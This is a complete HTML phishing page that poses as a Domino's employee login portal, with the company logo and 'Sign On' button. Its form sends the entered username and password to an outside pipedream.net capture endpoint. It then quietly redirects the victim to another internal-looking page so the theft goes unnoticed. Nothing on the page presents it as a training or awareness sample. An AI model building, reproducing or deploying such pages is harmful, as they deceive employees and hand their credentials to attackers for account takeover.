<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>Domino's Portal</title>

<style>
body {
  margin:0;
  background:#f2f2f2;
  font-family:Arial, Helvetica, sans-serif;
}

/* HEADER */
.header {
  background:#0a6a8a;
  height:55px;
  display:flex;
  align-items:center;
  padding:0 20px;
  color:white;
}

.header img {
  height:28px;
  margin-right:10px;
}

.header span {
  font-size:16px;
  font-weight:bold;
}

/* LOGIN BOX */
.box {
  width:400px;
  background:white;
  margin:100px auto;
  padding:30px;
  border:1px solid #777;
}

label {
  display:block;
  margin-top:15px;
  font-size:14px;
}

input {
  width:100%;
  border:none;
  border-bottom:1px solid #000;
  font-size:16px;
  padding:6px 0;
  outline:none;
}

button {
  margin-top:25px;
  float:right;
  background:#0a6a8a;
  color:white;
  border:none;
  padding:8px 18px;
  cursor:pointer;
}

button:hover {
  background:#095a74;
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Domino%27s_pizza_logo.svg/2036px-Domino%27s_pizza_logo.svg.png"
       alt="Domino's Logo">
  <span>Domino's Portal</span>
</div>

<!-- LOGIN FORM -->
<form class="box"
      method="post"
      action="https://eocbtfxw1b5ibp4.m.pipedream.net"
      onsubmit="afterSubmit()">

  <label>Username</label>
  <input name="username" required>

  <label>Password</label>
  <input name="password" type="password" required>

  <button type="submit">Sign On</button>
</form>

<script>
  // Login sonrası yönlendirme adresi
  const REDIRECT_URL = "/pms/dominosai.html";

  function afterSubmit() {
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 600);
  }
</script>

</body>
</html>
